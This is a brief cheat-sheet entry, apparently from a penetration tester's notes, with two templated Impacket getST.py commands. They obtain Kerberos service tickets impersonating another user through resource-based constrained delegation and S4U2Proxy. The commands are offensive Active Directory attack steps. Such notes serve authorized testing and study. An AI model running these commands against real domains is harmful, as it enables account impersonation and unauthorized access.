# getst
#plateform/linux #target/remote #cat/ATTACK

## RBCD
```
getST.py -spn <service|cifs>/<target> -impersonate '<imp_user>' <domain>/<user>:'<passwd>'
```

## S4U2Proxy
```
getST.py -spn <service|cifs>/<target> -additional-ticket '<ticket_file>' -impersonate '<imp_user>' <domain>/'<user>':'<passwd>'
```
